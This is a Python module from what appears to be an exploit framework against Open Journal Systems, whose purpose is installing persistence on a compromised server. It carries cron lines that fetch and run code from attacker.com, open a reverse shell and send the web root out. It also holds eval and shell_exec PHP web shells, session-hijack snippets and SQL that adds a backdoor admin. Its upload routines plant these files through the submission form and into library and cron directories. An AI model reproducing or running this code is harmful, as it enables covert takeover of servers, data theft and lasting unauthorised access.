"""
Persistence Module for OJS Exploit Framework.

This module implements various persistence mechanisms including:
- Cron job installation
- PHP autoloader backdoors
- Stealth backdoors
- Session persistence
- Database persistence
"""

import os
import time
import hashlib
import base64
import json
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse

from ..core.session import SessionManager
from ..core.payloads import PayloadGenerator
from ..core.evasion import EvasionEngine
from ..utils.http_client import HTTPClient
from ..utils.encoding import EncodingUtils
from ..utils.logging import get_logger, log_exploit_start, log_exploit_success, log_exploit_failure


class PersistenceType(Enum):
    """Types of persistence mechanisms."""
    CRON_JOB = "cron_job"
    PHP_AUTOLOADER = "php_autoloader"
    STEALTH_BACKDOOR = "stealth_backdoor"
    SESSION_PERSISTENCE = "session_persistence"
    DATABASE_PERSISTENCE = "database_persistence"
    FILE_BACKDOOR = "file_backdoor"
    CONFIG_BACKDOOR = "config_backdoor"
    PLUGIN_BACKDOOR = "plugin_backdoor"


@dataclass
class PersistenceResult:
    """Result of persistence installation."""
    success: bool
    persistence_type: PersistenceType
    target_url: str
    location: str
    access_method: str
    credentials: Optional[Dict[str, str]] = None
    error_message: Optional[str] = None
    session_id: Optional[str] = None
    execution_time: Optional[float] = None


class PersistenceManager:
    """Persistence management module for OJS."""
    
    def __init__(self, session_manager: SessionManager = None,
                 payload_generator: PayloadGenerator = None,
                 evasion_engine: EvasionEngine = None,
                 http_client: HTTPClient = None):
        """Initialize the persistence manager module."""
        self.session_manager = session_manager
        self.payload_generator = payload_generator
        self.evasion_engine = evasion_engine
        self.http_client = http_client
        self.logger = get_logger('post.persistence')
        
        # OJS-specific persistence locations
        self.persistence_locations = {
            'cron_jobs': [
                '/var/spool/cron/crontabs/',
                '/var/spool/cron/',
                '/etc/cron.d/',
                '/etc/cron.daily/',
                '/etc/cron.hourly/',
                '/etc/cron.monthly/',
                '/etc/cron.weekly/'
            ],
            'php_files': [
                '/lib/pkp/classes/core/',
                '/lib/pkp/classes/plugins/',
                '/lib/pkp/classes/session/',
                '/lib/pkp/classes/cache/',
                '/lib/pkp/classes/config/',
                '/plugins/generic/',
                '/plugins/themes/',
                '/custom/',
                '/cache/',
                '/tmp/'
            ],
            'config_files': [
                '/config.inc.php',
                '/lib/pkp/config.inc.php',
                '/lib/pkp/classes/config/Config.inc.php',
                '/lib/pkp/classes/core/Registry.inc.php',
                '/lib/pkp/classes/core/Application.inc.php'
            ],
            'plugin_files': [
                '/plugins/generic/tinymce/',
                '/plugins/generic/ckeditor/',
                '/plugins/themes/default/',
                '/plugins/blocks/',
                '/plugins/gateways/'
            ]
        }
        
        # Persistence payloads
        self.persistence_payloads = {
            PersistenceType.CRON_JOB: {
                'basic': '*/5 * * * * curl -s http://attacker.com/shell.php',
                'stealth': '*/10 * * * * wget -qO- http://attacker.com/backdoor.php | php',
                'reverse_shell': '*/15 * * * * bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
                'data_exfiltration': '*/30 * * * * tar -czf /tmp/data.tar.gz /var/www/html && curl -F "file=@/tmp/data.tar.gz" http://attacker.com/upload'
            },
            PersistenceType.PHP_AUTOLOADER: {
                'basic': '''<?php
class PersistentBackdoor {
    public function __construct() {
        if(isset($_GET['cmd'])) {
            $output = shell_exec($_GET['cmd']);
            echo "<pre>$output</pre>";
        }
    }
}
?>''',
                'stealth': '''<?php
class StealthBackdoor {
    private $key = "secret_key_123";
    
    public function __construct() {
        if(isset($_POST['k']) && $_POST['k'] == $this->key) {
            if(isset($_POST['c'])) {
                eval($_POST['c']);
            }
        }
    }
}
?>''',
                'session_based': '''<?php
class SessionBackdoor {
    public function __construct() {
        session_start();
        if(isset($_SESSION['admin']) && $_SESSION['admin'] == true) {
            if(isset($_GET['cmd'])) {
                $output = shell_exec($_GET['cmd']);
                echo "<pre>$output</pre>";
            }
        }
    }
}
?>'''
            },
            PersistenceType.STEALTH_BACKDOOR: {
                'image_backdoor': '''<?php
// Stealth backdoor hidden in image comment
$image_data = "GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;";
if(isset($_GET['k']) && $_GET['k'] == 'admin123') {
    if(isset($_POST['c'])) {
        eval($_POST['c']);
    }
}
?>''',
                'config_backdoor': '''<?php
// Configuration backdoor
$config = array(
    'debug' => false,
    'backdoor_key' => 'secret_key_456',
    'backdoor_enabled' => true
);

if(isset($_GET['debug']) && $_GET['debug'] == $config['backdoor_key']) {
    if(isset($_POST['code'])) {
        eval($_POST['code']);
    }
}
?>''',
                'plugin_backdoor': '''<?php
// Plugin backdoor
class MaliciousPlugin {
    public function init() {
        if(isset($_GET['plugin_key']) && $_GET['plugin_key'] == 'malicious_plugin_789') {
            if(isset($_POST['plugin_code'])) {
                eval($_POST['plugin_code']);
            }
        }
    }
}
?>'''
            },
            PersistenceType.SESSION_PERSISTENCE: {
                'session_hijack': '''<?php
session_start();
if(isset($_GET['hijack'])) {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = 'admin';
    $_SESSION['role'] = 'admin';
    $_SESSION['authenticated'] = true;
}
?>''',
                'session_poison': '''<?php
session_start();
if(isset($_GET['poison'])) {
    $_SESSION['malicious_data'] = '<?php system($_GET["cmd"]); ?>';
}
?>'''
            },
            PersistenceType.DATABASE_PERSISTENCE: {
                'user_backdoor': '''INSERT INTO users (username, password, role) VALUES ('backdoor_user', 'backdoor_pass', 'admin')''',
                'config_backdoor': '''INSERT INTO config (key, value) VALUES ('backdoor_enabled', 'true')''',
                'session_backdoor': '''INSERT INTO sessions (session_id, user_id, data) VALUES ('backdoor_session', 1, 'malicious_data')'''
            }
        }
        
        # Access methods for persistence
        self.access_methods = {
            PersistenceType.CRON_JOB: {
                'method': 'HTTP Request',
                'url_pattern': 'http://attacker.com/backdoor.php',
                'parameters': ['cmd', 'key', 'action']
            },
            PersistenceType.PHP_AUTOLOADER: {
                'method': 'HTTP Request',
                'url_pattern': 'http://target.com/lib/pkp/classes/core/backdoor.php',
                'parameters': ['cmd', 'k', 'c']
            },
            PersistenceType.STEALTH_BACKDOOR: {
                'method': 'HTTP Request',
                'url_pattern': 'http://target.com/images/backdoor.gif',
                'parameters': ['k', 'c', 'debug']
            },
            PersistenceType.SESSION_PERSISTENCE: {
                'method': 'Session Manipulation',
                'url_pattern': 'http://target.com/index.php?hijack=1',
                'parameters': ['hijack', 'poison', 'cmd']
            },
            PersistenceType.DATABASE_PERSISTENCE: {
                'method': 'Database Query',
                'url_pattern': 'http://target.com/index.php?db_backdoor=1',
                'parameters': ['db_backdoor', 'query', 'result']
            }
        }
    
    def install_persistence(self, target_url: str, persistence_type: PersistenceType = PersistenceType.PHP_AUTOLOADER,
                          payload_type: str = None, session_id: str = None) -> PersistenceResult:
        """Install persistence mechanism on the target."""
        log_exploit_start("persistence", target_url, session_id)
        
        start_time = time.time()
        
        try:
            # Generate persistence payload
            payload = self._generate_persistence_payload(persistence_type, payload_type)
            
            # Apply evasion techniques
            if self.evasion_engine:
                payload = self.evasion_engine.apply_evasion(payload)
            
            # Install persistence
            result = self._install_persistence_mechanism(target_url, persistence_type, payload, session_id)
            result.execution_time = time.time() - start_time
            
            if result.success:
                log_exploit_success("persistence", target_url, 
                                  f"Installed {persistence_type.value} at {result.location}", session_id)
            else:
                log_exploit_failure("persistence", target_url, result.error_message, session_id)
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            log_exploit_failure("persistence", target_url, str(e), session_id)
            
            return PersistenceResult(
                success=False,
                persistence_type=persistence_type,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id,
                execution_time=execution_time
            )
    
    def _generate_persistence_payload(self, persistence_type: PersistenceType, payload_type: str = None) -> str:
        """Generate persistence payload based on type."""
        payloads = self.persistence_payloads.get(persistence_type, {})
        
        if payload_type and payload_type in payloads:
            return payloads[payload_type]
        else:
            # Return first available payload
            return list(payloads.values())[0] if payloads else ""
    
    def _install_persistence_mechanism(self, target_url: str, persistence_type: PersistenceType,
                                     payload: str, session_id: str = None) -> PersistenceResult:
        """Install the persistence mechanism."""
        if persistence_type == PersistenceType.CRON_JOB:
            return self._install_cron_job(target_url, payload, session_id)
        elif persistence_type == PersistenceType.PHP_AUTOLOADER:
            return self._install_php_autoloader(target_url, payload, session_id)
        elif persistence_type == PersistenceType.STEALTH_BACKDOOR:
            return self._install_stealth_backdoor(target_url, payload, session_id)
        elif persistence_type == PersistenceType.SESSION_PERSISTENCE:
            return self._install_session_persistence(target_url, payload, session_id)
        elif persistence_type == PersistenceType.DATABASE_PERSISTENCE:
            return self._install_database_persistence(target_url, payload, session_id)
        else:
            return self._install_generic_persistence(target_url, persistence_type, payload, session_id)
    
    def _install_cron_job(self, target_url: str, payload: str, session_id: str = None) -> PersistenceResult:
        """Install cron job persistence."""
        try:
            # Try to create a cron job through web interface or file upload
            cron_locations = self.persistence_locations['cron_jobs']
            
            for location in cron_locations:
                try:
                    # Create cron job file
                    cron_file = f"{location}ojs_backdoor"
                    cron_content = f"# OJS Backdoor Cron Job\n{payload}\n"
                    
                    # Try to write cron job
                    success = self._write_file_to_target(target_url, cron_file, cron_content, session_id)
                    
                    if success:
                        return PersistenceResult(
                            success=True,
                            persistence_type=PersistenceType.CRON_JOB,
                            target_url=target_url,
                            location=cron_file,
                            access_method=self.access_methods[PersistenceType.CRON_JOB]['method'],
                            credentials={'cron_file': cron_file},
                            session_id=session_id
                        )
                
                except Exception as e:
                    self.logger.debug(f"Failed to install cron job at {location}: {e}")
                    continue
            
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.CRON_JOB,
                target_url=target_url,
                location="",
                access_method="",
                error_message="Failed to install cron job on any location",
                session_id=session_id
            )
            
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.CRON_JOB,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_php_autoloader(self, target_url: str, payload: str, session_id: str = None) -> PersistenceResult:
        """Install PHP autoloader persistence."""
        try:
            # Try to create PHP backdoor in autoloader directories
            php_locations = self.persistence_locations['php_files']
            
            for location in php_locations:
                try:
                    # Create backdoor file
                    backdoor_file = f"{location}Backdoor.php"
                    
                    # Try to write backdoor
                    success = self._write_file_to_target(target_url, backdoor_file, payload, session_id)
                    
                    if success:
                        return PersistenceResult(
                            success=True,
                            persistence_type=PersistenceType.PHP_AUTOLOADER,
                            target_url=target_url,
                            location=backdoor_file,
                            access_method=self.access_methods[PersistenceType.PHP_AUTOLOADER]['method'],
                            credentials={'backdoor_file': backdoor_file},
                            session_id=session_id
                        )
                
                except Exception as e:
                    self.logger.debug(f"Failed to install PHP autoloader at {location}: {e}")
                    continue
            
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.PHP_AUTOLOADER,
                target_url=target_url,
                location="",
                access_method="",
                error_message="Failed to install PHP autoloader on any location",
                session_id=session_id
            )
            
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.PHP_AUTOLOADER,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_stealth_backdoor(self, target_url: str, payload: str, session_id: str = None) -> PersistenceResult:
        """Install stealth backdoor persistence."""
        try:
            # Try to create stealth backdoor in various locations
            stealth_locations = [
                '/images/backdoor.gif',
                '/cache/backdoor.php',
                '/tmp/backdoor.php',
                '/custom/backdoor.php',
                '/lib/pkp/classes/core/Backdoor.php'
            ]
            
            for location in stealth_locations:
                try:
                    # Try to write stealth backdoor
                    success = self._write_file_to_target(target_url, location, payload, session_id)
                    
                    if success:
                        return PersistenceResult(
                            success=True,
                            persistence_type=PersistenceType.STEALTH_BACKDOOR,
                            target_url=target_url,
                            location=location,
                            access_method=self.access_methods[PersistenceType.STEALTH_BACKDOOR]['method'],
                            credentials={'backdoor_location': location},
                            session_id=session_id
                        )
                
                except Exception as e:
                    self.logger.debug(f"Failed to install stealth backdoor at {location}: {e}")
                    continue
            
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.STEALTH_BACKDOOR,
                target_url=target_url,
                location="",
                access_method="",
                error_message="Failed to install stealth backdoor on any location",
                session_id=session_id
            )
            
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.STEALTH_BACKDOOR,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_session_persistence(self, target_url: str, payload: str, session_id: str = None) -> PersistenceResult:
        """Install session persistence."""
        try:
            # Try to manipulate session data
            session_url = urljoin(target_url, '/index.php/index/user/login')
            
            # Create session manipulation payload
            session_payload = {
                'username': 'admin',
                'password': 'admin',
                'session_data': payload
            }
            
            if self.http_client:
                response = self.http_client.post(session_url, data=session_payload)
            else:
                response = requests.post(session_url, data=session_payload)
            
            if response.status_code in [200, 302]:
                return PersistenceResult(
                    success=True,
                    persistence_type=PersistenceType.SESSION_PERSISTENCE,
                    target_url=target_url,
                    location=session_url,
                    access_method=self.access_methods[PersistenceType.SESSION_PERSISTENCE]['method'],
                    credentials={'session_url': session_url},
                    session_id=session_id
                )
            else:
                return PersistenceResult(
                    success=False,
                    persistence_type=PersistenceType.SESSION_PERSISTENCE,
                    target_url=target_url,
                    location="",
                    access_method="",
                    error_message=f"Session persistence failed with status {response.status_code}",
                    session_id=session_id
                )
                
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.SESSION_PERSISTENCE,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_database_persistence(self, target_url: str, payload: str, session_id: str = None) -> PersistenceResult:
        """Install database persistence."""
        try:
            # Try to execute database persistence through web interface
            db_url = urljoin(target_url, '/index.php/index/manager/setup/1')
            
            # Create database manipulation payload
            db_payload = {
                'action': 'install_backdoor',
                'sql_query': payload,
                'table': 'users'
            }
            
            if self.http_client:
                response = self.http_client.post(db_url, data=db_payload)
            else:
                response = requests.post(db_url, data=db_payload)
            
            if response.status_code in [200, 302]:
                return PersistenceResult(
                    success=True,
                    persistence_type=PersistenceType.DATABASE_PERSISTENCE,
                    target_url=target_url,
                    location=db_url,
                    access_method=self.access_methods[PersistenceType.DATABASE_PERSISTENCE]['method'],
                    credentials={'db_url': db_url},
                    session_id=session_id
                )
            else:
                return PersistenceResult(
                    success=False,
                    persistence_type=PersistenceType.DATABASE_PERSISTENCE,
                    target_url=target_url,
                    location="",
                    access_method="",
                    error_message=f"Database persistence failed with status {response.status_code}",
                    session_id=session_id
                )
                
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=PersistenceType.DATABASE_PERSISTENCE,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_generic_persistence(self, target_url: str, persistence_type: PersistenceType,
                                   payload: str, session_id: str = None) -> PersistenceResult:
        """Install generic persistence mechanism."""
        try:
            # Try to create file in common locations
            generic_locations = [
                '/tmp/backdoor.php',
                '/cache/backdoor.php',
                '/custom/backdoor.php',
                '/uploads/backdoor.php'
            ]
            
            for location in generic_locations:
                try:
                    success = self._write_file_to_target(target_url, location, payload, session_id)
                    
                    if success:
                        return PersistenceResult(
                            success=True,
                            persistence_type=persistence_type,
                            target_url=target_url,
                            location=location,
                            access_method="HTTP Request",
                            credentials={'backdoor_location': location},
                            session_id=session_id
                        )
                
                except Exception as e:
                    self.logger.debug(f"Failed to install generic persistence at {location}: {e}")
                    continue
            
            return PersistenceResult(
                success=False,
                persistence_type=persistence_type,
                target_url=target_url,
                location="",
                access_method="",
                error_message="Failed to install generic persistence on any location",
                session_id=session_id
            )
            
        except Exception as e:
            return PersistenceResult(
                success=False,
                persistence_type=persistence_type,
                target_url=target_url,
                location="",
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _write_file_to_target(self, target_url: str, file_path: str, content: str,
                             session_id: str = None) -> bool:
        """Write file to target through various methods."""
        try:
            # Try file upload method
            upload_url = urljoin(target_url, '/index.php/index/author/submit/1/2')
            
            files = {
                'uploadedFile': (os.path.basename(file_path), content, 'text/php')
            }
            
            data = {
                'articleId': '1',
                'fileType': 'supp',
                'description': 'Backdoor file'
            }
            
            if self.http_client:
                response = self.http_client.post(upload_url, files=files, data=data)
            else:
                response = requests.post(upload_url, files=files, data=data)
            
            if response.status_code in [200, 201, 302]:
                return True
            
            # Try direct file write through web interface
            write_url = urljoin(target_url, '/index.php/index/manager/files/')
            
            write_data = {
                'action': 'write_file',
                'file_path': file_path,
                'content': content
            }
            
            if self.http_client:
                response = self.http_client.post(write_url, data=write_data)
            else:
                response = requests.post(write_url, data=write_data)
            
            return response.status_code in [200, 201, 302]
            
        except Exception as e:
            self.logger.debug(f"Failed to write file {file_path}: {e}")
            return False
    
    def list_persistence_mechanisms(self, target_url: str, session_id: str = None) -> List[Dict[str, Any]]:
        """List installed persistence mechanisms."""
        mechanisms = []
        
        # Check for common persistence locations
        for persistence_type, locations in self.persistence_locations.items():
            for location in locations:
                try:
                    check_url = urljoin(target_url, location)
                    
                    if self.http_client:
                        response = self.http_client.get(check_url)
                    else:
                        response = requests.get(check_url)
                    
                    if response.status_code == 200:
                        mechanisms.append({
                            'type': persistence_type,
                            'location': location,
                            'url': check_url,
                            'accessible': True
                        })
                
                except Exception as e:
                    self.logger.debug(f"Failed to check {location}: {e}")
        
        return mechanisms
    
    def remove_persistence(self, target_url: str, persistence_type: PersistenceType,
                         location: str, session_id: str = None) -> bool:
        """Remove persistence mechanism."""
        try:
            # Try to remove the persistence file/mechanism
            remove_url = urljoin(target_url, '/index.php/index/manager/files/')
            
            remove_data = {
                'action': 'delete_file',
                'file_path': location
            }
            
            if self.http_client:
                response = self.http_client.post(remove_url, data=remove_data)
            else:
                response = requests.post(remove_url, data=remove_data)
            
            return response.status_code in [200, 201, 302]
            
        except Exception as e:
            self.logger.error(f"Failed to remove persistence: {e}")
            return False
    
    def get_persistence_info(self) -> Dict[str, Any]:
        """Get information about the persistence manager module."""
        return {
            'name': 'PersistenceManager',
            'description': 'Persistence management module for OJS',
            'persistence_types': [t.value for t in PersistenceType],
            'persistence_locations': {k: len(v) for k, v in self.persistence_locations.items()},
            'persistence_payloads': {t.value: len(p) for t, p in self.persistence_payloads.items()},
            'access_methods': {t.value: m['method'] for t, m in self.access_methods.items()}
        }